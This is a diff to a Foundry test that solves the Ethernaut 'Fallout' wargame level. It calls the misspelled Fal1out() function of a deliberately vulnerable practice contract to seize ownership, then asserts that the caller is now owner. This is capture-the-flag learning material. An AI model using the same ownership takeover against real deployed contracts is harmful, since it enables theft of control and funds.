@@ -58,6 +58,17 @@ contract FalloutTest is Test {
         Fallout instance = Fallout(payable(instanceAddress));
 
         /* Level Hack */
+        // 0. Check current owner
+        address owner = instance.owner();
+        emit log_named_address("owner", owner);
+        assertEq(owner, address(0));
+
+        // 1. Call Fal1out() method
+        instance.Fal1out();
+
+        owner = instance.owner();
+        emit log_named_address("owner", owner);
+        assertEq(owner, address(eoa));
 
         /* Level Submit */
         // Start recording logs to capture level completed log
